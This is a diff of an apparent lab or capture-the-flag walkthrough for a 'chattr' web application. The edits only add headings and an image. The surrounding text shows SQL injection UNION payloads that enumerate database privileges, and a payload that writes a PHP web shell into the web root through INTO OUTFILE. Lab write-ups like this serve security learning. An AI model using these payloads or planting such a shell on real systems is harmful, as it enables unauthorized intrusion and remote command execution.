@@ -103,13 +103,19 @@ Lets inspect the "Username" and "Password"
 
 - This gives us the password hashes!
 
+
+## User Privileges:
+
 Next, lets see what permissions are avalible with the payload:
 
     ') UNION SELECT 1,2,GRANTEE,PRIVILEGE_TYPE FROM information_schema.USER_PRIVILEGES-- -
 
-  <------ Include image ------>
+<img width="1002" height="446" alt="usrPriv" src="https://github.com/user-attachments/assets/ee519225-0e24-4912-84a9-23c5d03c2e1f" />
 
 - This shows that user 'chattr_dbUser'@'localhost' has "FILE" permissions, meaning that we can read and write files.
+
+
+## Reading Configuration File: 
 
   - In the Recon stage we saw that the webserver is "nginx".
   - Knowing this we can try to read the servers configuration file:
@@ -137,7 +143,7 @@ Next, lets see what permissions are avalible with the payload:
 
 ## Remote Code Execution:
 
-Given that we have write permissions, let write some malicious code on the server.
+Given that we have write permissions, let have a bit of fun and write some malicious code on the server.
 
     ') UNION SELECT "","",'<?php system($_REQUEST[0]); ?>',"" into outfile "/var/www/chattr-prod/fSociety.php"-- -
 
